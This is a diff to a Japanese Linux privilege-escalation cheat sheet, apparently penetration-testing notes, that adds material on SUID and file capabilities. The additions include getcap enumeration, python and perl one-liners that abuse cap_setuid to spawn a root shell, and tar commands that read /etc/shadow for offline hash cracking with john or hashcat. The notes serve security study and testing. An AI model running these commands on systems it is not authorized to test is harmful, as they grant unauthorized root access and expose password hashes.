@@ -1190,7 +1190,8 @@ find / -name <ファイル名> -type f 2>>/dev/null
 - 2>>/dev/null...全てのエラーを破棄
 
 ### SUID
-Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
+SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
+これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
 まずはSUIDファイルを見つける。
 下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
 ```
@@ -1220,10 +1221,50 @@ find / -perm -4000 -type f 2>/dev/null
 列挙後、権限昇格に使えそうなものをGTFOで調べる  
 https://gtfobins.github.io/
 
+
 ### chmod777に設定したfile/dirを検索
 ```
 find / -type f -perm 777
 ```
+
+### Capability
+SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
+これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
+Capabilityは通常ルートに割り当てられているアクションを細かく分割して実行する仕組み。  
+これを利用することで、通常80番ポートなどの1024以下のポートでWebサーバーなどをリッスンさせるためにはルート権限が必要だが、Webサーバーデーモンにroot権限を与えるのではなく、CAP_NET_BIND_SERVICEなどのCapabilitiesを設定することで簡単に80番ポートを開放することができる。  
+python，perl，tarが表示されれば、Capablityを利用して権限昇格できる可能性あり。
+```
+getcap -r / 2>/dev/null
+```
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl5.30.0 = cap_setuid+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+#### cap_setuid+ep
+```
+python3:
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+perl:
+./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+
+#### cap_dac_read_search+ep
+- tarを使用して/etc/shadowを圧縮
+- shadow.tarが生成される
+- shadow.tarを展開するとetc/shadowディレクトリが作成される
+- catなどで読み取り、パスワードハッシュをjohnやhashcatで解析する
+```
+./tar cvf shadow.tar /etc/shadow
+./tar -xvf shadow.tar
+cat etc/shadow
+```
+
 ### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
 改行コードをCRLFからLFに置換して実行できるかを確認する。
 ```
@@ -1233,7 +1274,6 @@ sed -i 's/\r//' *.sh
 ### pspy
 ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
 馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
-
 
 ### tools
 php-reverse-shell:  
